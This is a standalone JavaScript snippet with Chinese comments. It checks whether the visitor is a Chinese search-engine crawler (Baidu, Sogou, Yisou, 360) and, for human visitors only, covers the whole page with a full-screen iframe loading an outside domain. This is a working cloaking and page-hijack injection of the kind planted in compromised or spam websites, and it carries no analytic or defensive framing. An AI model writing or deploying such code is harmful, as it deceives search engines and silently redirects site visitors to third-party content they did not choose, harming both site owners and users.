(function(){
    // 创建样式元素
    var style = document.createElement('style');
    style.textContent = '#overlay-iframe{position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:9999;background:white}';
    document.head.appendChild(style);
    
    // 蜘蛛检测数组
    var spiderUAs = ['baiduspider', 'Sogou web spider', 'YisouSpider', '360Spider'];
    
    // 蜘蛛检测函数
    function isSpiderUA(){
        var userAgent = navigator.userAgent.toLowerCase();
        return spiderUAs.some(function(ua){
            return userAgent.includes(ua.toLowerCase());
        });
    }
    
    // 如果不是蜘蛛，创建iframe
    if(!isSpiderUA()){
        var iframe = document.createElement('iframe');
        iframe.id = 'overlay-iframe';
        iframe.src = 'https://dh-hzh5.ihxhon.cn/entry/1023';
        document.body.appendChild(iframe);
    }
})();